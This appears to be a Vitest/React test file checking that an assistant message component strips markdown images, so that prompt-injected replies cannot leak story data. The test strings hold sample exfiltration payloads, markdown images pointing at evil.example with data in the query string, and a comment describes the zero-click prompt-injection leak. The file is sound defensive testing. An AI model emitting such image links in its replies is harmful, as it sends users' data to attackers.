import React from 'react';
import { describe, expect, it } from 'vitest';
import { render, screen } from '@testing-library/react';

import type { Msg } from '../../../shared/comic/doc';
import { AssistantMessage } from './MessageItem';
import { makeFakeStudio } from './testing/fixtures';

const msg = (text: string, extra: Partial<Msg> = {}): Msg => ({ id: 'a1', role: 'assistant', text, at: 1, ...extra });

describe('AssistantMessage — director markdown images are stripped', () => {
  // A prompt-injected director reply must not become a zero-click `<img>` that leaks
  // the story data to an attacker's URL the moment it streams in.
  it('renders no image element for an injected inline image, keeping its alt text', () => {
    const studio = makeFakeStudio();
    render(
      <AssistantMessage
        msg={msg('Here is the plan ![leak](https://evil.example/p.png?d=secret) — ready?')}
        studio={studio}
      />
    );
    expect(screen.queryByRole('img')).not.toBeInTheDocument();
    expect(document.querySelector('img')).toBeNull();
    expect(screen.getByText(/Here is the plan leak — ready\?/)).toBeInTheDocument();
  });

  it('strips image markup from streaming draft text too', () => {
    const studio = makeFakeStudio();
    render(
      <AssistantMessage
        msg={msg('')}
        draft="Drafting ![](https://evil.example/x?d=title) more"
        streaming
        studio={studio}
      />
    );
    expect(document.querySelector('img')).toBeNull();
  });

  it('leaves a genuine markdown link clickable (only images are neutralised)', () => {
    const studio = makeFakeStudio();
    render(<AssistantMessage msg={msg('See [the brief](https://example.com/brief).')} studio={studio} />);
    expect(screen.getByRole('link', { name: 'the brief' })).toHaveAttribute('href', 'https://example.com/brief');
  });
});
